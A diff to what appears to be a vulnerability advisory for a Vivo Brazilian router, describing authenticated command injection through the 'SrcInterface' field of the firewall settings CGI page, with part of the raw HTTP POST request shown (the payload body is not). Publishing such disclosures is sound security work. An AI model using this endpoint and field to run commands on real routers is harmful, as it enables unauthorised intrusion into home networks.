@@ -3,7 +3,7 @@
 Vivo brazilian router is vulnerable to a authenticated remote code execution in the firewall settings page.<br>
 The "SrcInterface" was tested and it is vulnerable.<br>
 It is possible to run a ping command in the router.<br>
-Run a tcpdump in the other end and see the packets being received.<br>
+Run tcpdump in the other end and see the packets being received.<br>
 
 POST /cgi-bin/settings-firewall.cgi HTTP/1.1<br>
 Host: 192.168.15.1<br>
@@ -16,7 +16,7 @@ X-Requested-With: XMLHttpRequest<br>
 Content-Length: 273<br>
 Origin: http://192.168.15.1<br>
 Connection: keep-alive<br>
-Referer: http://192.168.15.1/cgi-bin/settings-firewall.cgi?isEdit=1&ApplyFlag=1&Index=0<br>
+Referer: http://192.168.15.1/cgi-bin/settings-firewall.cgi<br>
 Cookie: COOKIE_SESSION_KEY=8cc78d1a049bbc63f372d8cfec6886d1<br>
 Priority: u=0<br>
 
